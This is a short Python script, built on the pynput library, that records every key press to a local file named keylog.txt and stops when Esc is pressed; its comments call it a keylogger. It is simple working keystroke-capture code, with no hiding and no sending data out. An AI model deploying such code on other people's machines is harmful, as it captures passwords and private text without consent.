from pynput.keyboard import Key, Listener

# Function to write the key presses tro a file
def on_press(key):
    with open("keylog.txt", "a") as f:
        f.write(str(key) + '\n')

# Function to stop the keylogger when a certain key combination is pressed
def on_release(key):
    if key == Key.esc:
        return False
    
# Start listening for key presses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
